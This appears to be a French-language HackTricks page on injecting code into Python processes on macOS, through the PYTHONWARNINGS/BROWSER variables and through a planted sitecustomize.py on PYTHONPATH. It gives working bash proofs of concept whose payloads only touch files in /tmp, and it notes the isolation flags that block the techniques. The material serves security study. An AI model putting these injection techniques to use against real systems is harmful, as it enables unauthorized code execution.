# Injection d'applications Python macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via les variables d'environnement `PYTHONWARNINGS` et `BROWSER`

Si un attaquant peut contrôler l'environnement d'un processus Python, la combinaison de `PYTHONWARNINGS` et `BROWSER` peut déclencher l'exécution de commandes lorsque Python importe le module `antigravity` lors du traitement d'une option d'avertissement forgée. Cette technique repose sur le fait que `antigravity` ouvre une URL avec le module `webbrowser` de Python, qui respecte la variable d'environnement `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Via `PYTHONPATH` et `sitecustomize.py`

Lors du démarrage normal, le module Python `site` ajoute les chemins spécifiques au site, puis tente d'importer un module nommé `sitecustomize`. En plaçant en premier sur `PYTHONPATH` un répertoire lisible par l'attaquant, un attaquant qui contrôle l'environnement du processus peut faire importer un payload avant le script cible. Le flag `-S` désactive l'initialisation automatique de `site`, tandis que le mode isolé (`-I`) ignore `PYTHONPATH` et implique `-s` et `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking avec les variables d'environnement - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuration spécifique au site](https://docs.python.org/3/library/site.html)
- [3] [Ligne de commande et environnement Python](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
